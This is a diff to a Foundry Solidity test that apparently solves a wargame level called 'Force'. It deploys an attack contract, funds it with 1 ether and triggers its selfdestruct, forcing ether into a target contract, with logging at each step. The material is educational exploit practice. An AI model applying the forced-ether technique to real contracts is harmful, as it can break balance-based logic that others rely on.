@@ -45,7 +45,12 @@ contract ForceTest is Test {
             "Initial Force contract's balance: ",
             address(forceContract).balance
         );
+        emit log_named_address(
+            "Force contract address: ",
+            address(forceContract)
+        );
 
+        // 1st step - attack contract deployment
         ForceAttack forceAttack = new ForceAttack(address(forceContract));
 
         /*//////////////////////////////////////////////////////////////
@@ -53,6 +58,28 @@ contract ForceTest is Test {
         //////////////////////////////////////////////////////////////*/
 
         emit log_string("Starting the exploit... 🧨");
+
+        // 2nd step - funding the attack contract
+        emit log_string("Funding the Attack contract with 1 eth");
+        vm.deal(address(forceAttack), 1 ether);
+        emit log_named_uint(
+            "The balance of the Attack contract: ",
+            address(forceAttack).balance
+        );
+
+        // 3rd step - triggering selfdestruct
+        emit log_string("Destroying the Attack contract...");
+        forceAttack.attackForceContract();
+        emit log_string("Attack contract destroyed ☠️");
+        emit log_named_address(
+            "Funds transferred to: ",
+            address(forceContract)
+        );
+
+        emit log_named_uint(
+            "The balance of the Force contract: ",
+            address(forceContract).balance
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
